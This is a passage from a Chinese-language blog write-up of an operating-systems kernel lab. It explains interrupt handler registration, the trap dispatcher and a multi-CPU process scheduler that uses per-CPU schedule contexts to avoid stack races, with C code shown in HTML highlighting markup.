panic_on(iter-&gt;event != MAGIC_EVENT, <span class="string">&quot;error event&quot;</span>);</span><br><span class="line">  panic_on(iter-&gt;handler != MAGIC_HANDLER, <span class="string">&quot;error handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 由于中断处理程序按照seq从小到大排序</span></span><br><span class="line"><span class="comment">   * 因此下面开始从头遍历即可，插入到第一个节点的seq大于等于带插入的seq,</span></span><br><span class="line"><span class="comment">   * 插入该节点前面即可</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">while</span>(iter-&gt;next &amp;&amp; iter-&gt;next-&gt;seq &lt; seq) &#123; iter = iter-&gt;next; &#125;</span><br><span class="line"></span><br><span class="line">  Irq *irq = (Irq*)pmm-&gt;alloc(<span class="keyword">sizeof</span>(Irq));</span><br><span class="line">  panic_on(irq == <span class="literal">NULL</span>, <span class="string">&quot;not enough space&quot;</span>);</span><br><span class="line"></span><br><span class="line">  irq-&gt;seq = seq;</span><br><span class="line">  irq-&gt;event = event;</span><br><span class="line">  irq-&gt;handler = handler;</span><br><span class="line">  irq-&gt;next = iter-&gt;next;</span><br><span class="line"></span><br><span class="line">  iter-&gt;next = irq;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="调用中断处理程序"><a href="#调用中断处理程序" class="headerlink" title="调用中断处理程序"></a>调用中断处理程序</h4><p>  对于中断的响应，实验指南中也给了比较明确的框架，就是简单的遍历一遍上述的链表，并根据注册的中断事件和传入的中断事件进行匹配，并根据匹配结构来进行执行与否即可，代码如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 操作系统的中断处理程序</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 根据实验指南的说明，其每一次能且仅能返回一个Context</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 流程就是遍历一遍前面注册的中断处理程序即可，当event符合事，进行调用即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 在中断处理程序中，其已经是关闭中断的，因此无需考虑执行时被其他程序打断(因为中断处理程序不会主动让出cpu)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> Context *</span><br><span class="line"><span class="title function_">os_trap</span><span class="params">(Event ev, Context *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">  panic_on(ienabled() != <span class="literal">false</span>, <span class="string">&quot;error ienabled&quot;</span>);</span><br><span class="line">  panic_on(ctx == <span class="literal">NULL</span>, <span class="string">&quot;error ctx&quot;</span>);</span><br><span class="line"></span><br><span class="line">  debug_irq(<span class="string">&quot;%s&quot;</span>, ev.msg);</span><br><span class="line"></span><br><span class="line">  Context *next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 下面尝试遍历中断处理程序的链表</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  panic_on(irqs.seq != MAGIC_SEQ, <span class="string">&quot;error seq&quot;</span>);</span><br><span class="line">  panic_on(irqs.event != MAGIC_EVENT, <span class="string">&quot;error event&quot;</span>);</span><br><span class="line">  panic_on(irqs.handler != MAGIC_HANDLER, <span class="string">&quot;error handler&quot;</span>);</span><br><span class="line">  Irq *iter = irqs.next;</span><br><span class="line">  <span class="keyword">while</span>(iter) &#123;</span><br><span class="line">    <span class="keyword">if</span>(iter-&gt;event == EVENT_NULL || iter-&gt;event == ev.event) &#123;</span><br><span class="line">      Context *temp = iter-&gt;handler(ev, ctx);</span><br><span class="line">      panic_on(temp &amp;&amp; next, <span class="string">&quot;multiple context&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(temp) &#123; next = temp; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    iter = iter-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  panic_on(next == <span class="literal">NULL</span>, <span class="string">&quot;no context&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h3><p>  有一说一，进程调度是本次试验我认为最<strong>有趣</strong>的地方，疯狂的<strong>debug</strong>，极大地加深了我对于<strong>panic_on</strong>和测试样例的认识。💀</p><h4 id="进程结构体"><a href="#进程结构体" class="headerlink" title="进程结构体"></a>进程结构体</h4><p>  这里实现的进程的结构体如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * kmt中进程的数据结构</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMT_FENCE             (0x17377199)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMT_FENCE_SIZE        (2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMT_STACK_SIZE        (8192)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMT_INIT_ROUND        (10)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task</span> &#123;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    READY,                             <span class="comment">//可以被调度</span></span><br><span class="line">    RUNNING,                           <span class="comment">//正在被CPU执行</span></span><br><span class="line">    WAIT_TO_SCHEDULE,                  <span class="comment">//等待被调度进程调度</span></span><br><span class="line">    WAIT_TO_LOAD,                      <span class="comment">//被调度进程选中，但是还没有完成上下文加载</span></span><br><span class="line">    WAIT_TO_AWAKE_AND_SCHEDULE,        <span class="comment">//当前进程缺乏资源，需要等待其他进程唤醒，并且没有经过调度进程调度，会有栈数据竞争风险</span></span><br><span class="line">    WAIT_TO_AWAKE,                      <span class="comment">//当前进程缺乏资源，需要等待其他进程唤醒</span></span><br><span class="line">    DEAD,                              <span class="comment">//即其永远不会在被调度，可以释放其资源</span></span><br><span class="line">  &#125; status;</span><br><span class="line">  <span class="type">int</span> round;                           <span class="comment">//剩余的时间片</span></span><br><span class="line">  Context *context;</span><br><span class="line">  <span class="type">task_t</span> *fd, *bk;</span><br><span class="line">  <span class="type">sem_t</span> *fake_sem_fd, *fake_sem_bk;     <span class="comment">//等待队列的链表结构</span></span><br><span class="line">  <span class="type">uint32_t</span> fence1[KMT_FENCE_SIZE];</span><br><span class="line">  <span class="type">uint8_t</span> <span class="built_in">stack</span>[KMT_STACK_SIZE];</span><br><span class="line">  <span class="type">uint32_t</span> fence2[KMT_FENCE_SIZE];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>  除了<strong>fake_sem_fd</strong>和<strong>fake_sem_bk</strong>字段，其余字段都是其他进程结构中非常常见的字段。<br>  而对于<strong>fake_sem_fd</strong>和<strong>fake_sem_bk</strong>字段，其是后面信号量中由双向循环链表抽象的等待队列的相关结构</p><h4 id="进程调度-1"><a href="#进程调度-1" class="headerlink" title="进程调度"></a>进程调度</h4><p>  进程调度是通过中断实现的——一般是由时间中断或yield中断的响应，引起进程调度</p><p>  因此，首先需要弄明白中断的过程(这里有大坑)</p><h5 id="中断过程"><a href="#中断过程" class="headerlink" title="中断过程"></a>中断过程</h5><p>  实际上，其中断过程如下所示</p><ol><li><p>这里有进程A，正在执行，其上下文如下所示<br><img src="进程A初始状况.png" alt="进程A初始状况"></p></li><li><p>此时，进程A触发中断。则CPU会自动压入此时的上下文，然后执行<strong>trap</strong>逻辑(实际上还包含了其他的一些函数，这里就都抽象为<strong>trap</strong>)，最后跳转到前面实现的中断处理程序<strong>os-&gt;trap</strong>执行，如下所示<br><img src="进程A触发中断.png" alt="进程A触发中断"></p></li><li><p>执行<strong>os-&gt;trap</strong>执行后，其返回了新的上下文(可能还是进程A保存的上下文)。但注意，此时仍然在进程A的栈上，因此其会继续执行<strong>trap</strong>后面的指令。如下所示<br><img src="进程A执行完os_trap.png" alt="进程A执行完os-&gt;trap"></p></li><li><p>此时，后续的<strong>trap</strong>指令，会恢复前面返回的新的上下文，从而可能更换了栈结构，完成了一次中断<br><img src="trap恢复上下文.png" alt="trap恢复上下文"></p><p>实际上，进程调度就可以在<strong>os-&gt;trap</strong>中完成。如果我们注册了一个如下的中断处理程序，其会在每次中断时，将当前传入的context保存到进程的结构体中；然后在所有进程中选择一个可以调度的进行调度，即可完成进程调度。看起来貌似很美好，实际上这里就隐藏了数据竞争，如下图所示<br><img src="进程调度中的数据竞争.png" alt="进程调度中的数据竞争"><br>由于是多核CPU，当其中一个CPU将context保存到被中断进程A时，并且此时进程A可以被调度时，则产生了数据竞争——则很可能另一个CPU就调度了进程A，从而与前面的CPU共享一个栈，产生严重的数据竞争。</p></li></ol><p>  实际上，为了解决这个问题，这里参考了一个非常机智的方法——分析上面产生数据竞争的原因，就是中断处理程序和被中断处理程序共用一个栈导致的；如果对于每一个CPU，其每一次中断后，都首先转移到一个不同于被中断进程的中断处理栈，然后在进行相关的中断处理(比如调度)，最后在中断处理栈中继续后续操作，则完全不可能产生如下的数据竞争。</p><h5 id="中断逻辑"><a href="#中断逻辑" class="headerlink" title="中断逻辑"></a>中断逻辑</h5><p>  基于上面的中断过程及相关的分析，这里结合L2给出的框架代码，给出实验中实现的中断逻辑</p><p>  首先，为每一个CPU保存一个<strong>current_task</strong>指针，并且同时保存一个该CPU对应的调度上下文<strong>schedule_context</strong>。</p><p>  每一次中断处理的时候，如果处理非调度类型的中断，则按照上述流程执行即可——虽然被中断进程和中断进程共用一个栈，但是被中断进程不会被其他进程调度，并且中断进程返回的也仍是该被中断进程的上下文，因此不会数据竞争。其相关流程如下所示<br>  <img src="非调度的中断逻辑.png" alt="非调度的中断逻辑"></p><p>  如果处理的是调度类型的中断，则与上面的逻辑大不相同。根据分析，为了避免栈数据竞争，则首先需要返回提前准备好的调度上下文<strong>schedule_context</strong>；然后在调度上下文中，通过<strong>current_task</strong>指针更改被中断的进程的状态，并且选择待调度的进程，覆盖掉<strong>current_task</strong>。之后，主动在调用<strong>yield（）</strong>中断，触发中断处理程序，最终恢复<strong>current_task</strong>指针中的上下文，也就是调度时被选中的进程上下文。相关流程如下逻辑所示<br>  <img src="调度的中断逻辑.png" alt="调度的中断逻辑"></p><p>  最终，其相关的代码实现如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//kernel/src/kmt.c</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 这里提前实现一些对于列表的操作</span></span><br><span class="line"><span class="comment"> * 在列表的操作中，都没有申请锁</span></span><br><span class="line"><span class="comment"> * 仅仅确认一下获取锁了</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 遍历的时候沿着fd方向遍历，则插入沿着bk方向插入即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">list_insert</span><span class="params">(<span class="type">task_t</span> *head, <span class="type">task_t</span> *task)</span></span><br><span class="line">&#123;</span><br><span class="line">    panic_on(head == <span class="literal">NULL</span>, <span class="string">&quot;error task&quot;</span>);</span><br><span class="line">    panic_on(task == <span class="literal">NULL</span>, <span class="string">&quot;error task&quot;</span>);</span><br><span class="line"></span><br><span class="line">    panic_on(<span class="type">atomic_xchg</span>(&amp;(tasks_lock.lock), KMT_LOCKED) != KMT_LOCKED, <span class="string">&quot;did not locked the lock&quot;</span>);</span><br><span class="line">    CHECK_TASK_LIST(head);</span><br><span class="line">    CHECK_TASK_FENCE(head);</span><br><span class="line"></span><br><span class="line">    <span class="type">task_t</span> *fwd = head, *bck = fwd-&gt;bk;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    task-&gt;fd = fwd;</span><br><span class="line">    task-&gt;bk = bck;</span><br><span class="line">    fwd-&gt;bk = bck-&gt;fd = task;</span><br><span class="line"></span><br><span class="line">    CHECK_TASK_FENCE(task);</span><br><span class="line">    CHECK_TASK_LIST(task);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 对于列表删除操作来说，</span></span><br><span class="line"><span class="comment"> * 和列表插入操作十分相似</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 同样不会申请锁，仅仅确认一下锁而已</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">list_remove</span><span class="params">(<span class="type">task_t</span> *task)</span></span><br><span class="line">&#123;</span><br><span class="line">    panic_on(task == <span class="literal">NULL</span>, <span class="string">&quot;error task&quot;</span>);</span><br><span class="line"></span><br><span class="line">    panic_on(<span class="type">atomic_xchg</span>(&amp;(tasks_lock.lock), KMT_LOCKED) != KMT_LOCKED, <span class="string">&quot;did not locked the lock&quot;</span>);</span><br><span class="line">    CHECK_TASK_FENCE(task);</span><br><span class="line">    CHECK_TASK_LIST(task);</span><br><span class="line"></span><br><span class="line">    <span class="type">task_t</span> *fwd = task-&gt;fd, *bck = task-&gt;bk;</span><br><span class="line"></span><br><span class="line">    fwd-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd = fwd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 下面就是中断处理程序</span></span><br><span class="line"><span class="comment"> * 根据实验指南，每一次中断处理程序，都通过注册中断处理程序进行</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 中断处理程序包含最基本的两部分——上下文保存和上下文恢复</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 当前任务上下文保存：即保存中断处理程序中传入的Context即可</span></span><br><span class="line"><span class="comment"> * 恢复任务上下文：   根据状态信息，则返回对应的context即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 在中断处理程序中，由于current_tasks的状态要么是RUNNING，要么是WAIT_TO_LOAD，因此不可能被其他cpu访问，访问除了fd、bk字段时无需上锁</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 当前任务上下文保存，注册为最小的seq，从而确保每次中断第一个执行</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 当第一次进入os_trap的时候，其保存到被中断的进程即可，即currents_task中，此时其进程状态是RUNNING</span></span><br><span class="line"><span class="comment"> * 当第二次进入os_trap的时候，其保存到调度进程即可，即switchs_task中，此时其进程状态是WAIT_TO_LOAD</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> Context *</span><br><span class="line"><span class="title function_">save_context</span><span class="params">(Event ev, Context *context)</span></span><br><span class="line">&#123;</span><br><span class="line">    panic_on(context == <span class="literal">NULL</span>, <span class="string">&quot;error context&quot;</span>);</span><br><span class="line">    <span class="type">int</span> cpu = cpu_current();</span><br><span class="line">    <span class="type">task_t</span> *task = current_tasks[cpu];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(task-&gt;status) &#123;</span><br><span class="line">        <span class="keyword">case</span> RUNNING:</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 说明是非主动进行中断</span></span><br><span class="line"><span class="comment">             * 则简单保存上下文即可</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">case</span> WAIT_TO_AWAKE_AND_SCHEDULE:</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 当前进程被阻塞，</span></span><br><span class="line"><span class="comment">             * 则其保存上下文，然后等待调度即可</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line"></span><br><span class="line">            task-&gt;context = context;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> WAIT_TO_LOAD:</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 刚刚被调度进程选中，准备恢复该进程</span></span><br><span class="line"><span class="comment">             * 此时context是调度进程的上下文，则保存级即可</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            schedule_contexts[cpu] = context;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            panic(<span class="string">&quot;error status&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CHECK_TASK_CONTEXT(task);</span><br><span class="line">    CHECK_TASK_FENCE(task);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 恢复任务的上下文，注册为最大的seq，从而确保每次中断最后一个执行</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 其根据task的状态，分别设置相关的状态，返回相关的上下文即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> Context *</span><br><span class="line"><span class="title function_">load_context</span><span class="params">(Event ev, Context *context)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> cpu = cpu_current();</span><br><span class="line">    <span class="type">task_t</span> *task = current_tasks[cpu];</span><br><span class="line">    Context *next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(task-&gt;status) &#123;</span><br><span class="line">        <span class="keyword">case</span> RUNNING:</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 中断已经处理完毕</span></span><br><span class="line"><span class="comment">             * 可以继续运行</span></span><br><span class="line"><span class="comment">             * 则直接返回其上下文即可</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            next = task-&gt;context;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> WAIT_TO_AWAKE_AND_SCHEDULE:</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 当前进程被阻塞，</span></span><br><span class="line"><span class="comment">             * 则其保存上下文，然后等待调度即可</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">case</span> WAIT_TO_SCHEDULE:</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 说明当前进程需要被调度，</span></span><br><span class="line"><span class="comment">             * 则需要切换到调度进程上</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            next = schedule_contexts[cpu];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            panic(<span class="string">&quot;error status&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 时间中断处理程序</span></span><br><span class="line"><span class="comment"> * 这里就是简单的让进程进行调度即可</span></span><br><span class="line"><span class="comment"> * 因此这里设置进程状态即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> Context *</span><br><span class="line"><span class="title function_">irq_time_handle</span><span class="params">(Event ev, Context *context)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 经过了save_context后，其task的状态只有当前cpu可以更改，无需上锁</span></span><br><span class="line"><span class="comment">     * 将其状态标注为等待调度即可</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * 只有RUNNING状态的进程，才会发生TIME的中断，需要确认一下</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    panic_on(ev.event != EVENT_IRQ_TIMER, <span class="string">&quot;error ev&quot;</span>);</span><br><span class="line">    <span class="type">int</span> cpu = cpu_current();</span><br><span class="line">    <span class="type">task_t</span> *task = current_tasks[cpu];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (task-&gt;status)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> RUNNING:</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 如果进程是正常的RUNNING状态</span></span><br><span class="line"><span class="comment">             * 判断剩余的时间片，并且根据时间片状态，进行相关的切换</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span>(--task-&gt;round &lt;= <span class="number">0</span>) &#123; task-&gt;status = WAIT_TO_SCHEDULE;&#125;</span><br><span class="line">            <span 